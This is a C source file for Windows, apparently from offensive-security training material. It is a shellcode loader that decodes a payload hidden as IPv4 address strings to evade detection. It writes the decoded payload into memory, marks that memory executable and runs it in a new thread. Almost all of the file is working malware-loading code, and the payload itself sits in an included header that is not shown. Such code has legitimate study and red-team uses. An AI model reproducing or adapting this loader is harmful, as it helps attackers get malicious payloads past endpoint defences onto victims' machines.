#include <winsock2.h>
#include <Windows.h>
#include <stdio.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ntdll.lib")
#include "shellcode.h"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

BOOL DecodeIPv4Fuscation(
    const char* IPV4[],
    PVOID LpBaseAddress,
    SIZE_T* pSize
)
{
    PVOID LpBaseAddress2 = NULL;
    int i = 0;

    for (int j = 0; j < ElementsNumber; j++)
    {
        LpBaseAddress2 =
            (PVOID)((ULONG_PTR)LpBaseAddress + i);

        int result = inet_pton(
            AF_INET,
            IPV4[j],
            (IN_ADDR*)LpBaseAddress2
        );

        if (result != 1)
        {
            printf(
                "[!] inet_pton failed for %s\n",
                IPV4[j]
            );
            return FALSE;
        }
        i += 4;
    }

    if (pSize != NULL)
    {
        *pSize = (SIZE_T)i;
    }
    return TRUE;
}

int main() {
    PBYTE pDeobfuscatedPayload = NULL;
    SIZE_T sDeobfuscatedSize = shellcode_size; 

    printf("[i] injecting shellcode in PID: %d\n", GetCurrentProcessId());

    pDeobfuscatedPayload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sDeobfuscatedSize);
    if (pDeobfuscatedPayload == NULL) {
        printf("[-] HeapAlloc failed\n");
        return -1;
    }

    printf("[#] Decrypting...\n");

    if (!DecodeIPv4Fuscation(shellcode, pDeobfuscatedPayload, &sDeobfuscatedSize)) {
        printf("[-] failed\n");
        return -1;
    }
    printf("[+] decode success! Payload at: 0x%p & Size: %zu \n", pDeobfuscatedPayload, sDeobfuscatedSize);

    // 페이로드 저장공간 할당
    printf("[#] Allocating...\n");
    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[-] failed\n");
        return -1;
    }
    printf("[+] success! allocated memory at: 0x%p \n", pShellcodeAddress);

    // 할당된 메모리에 페이로드 저장
    printf("[#] Writing Payload...\n");
    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
    memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize); // 다 쓴 페이로드는 지우기

    // 메모리 권한 설정
    DWORD dwOldProtection = 0;
    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[-] failed with error %d\n", GetLastError());
        return -1;
    }

    // 새 스레드 만들어서 실행
    printf("[#] press <Enter> to run...\n");
    getchar();
    if (CreateThread(NULL, 0, pShellcodeAddress, NULL, 0, NULL) == NULL) {
        printf("[-] failed with error %d\n", GetLastError());
        return -1;
    }

    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    printf("[#] press <Enter> to Quit...\n");
    getchar();

    return 0;
}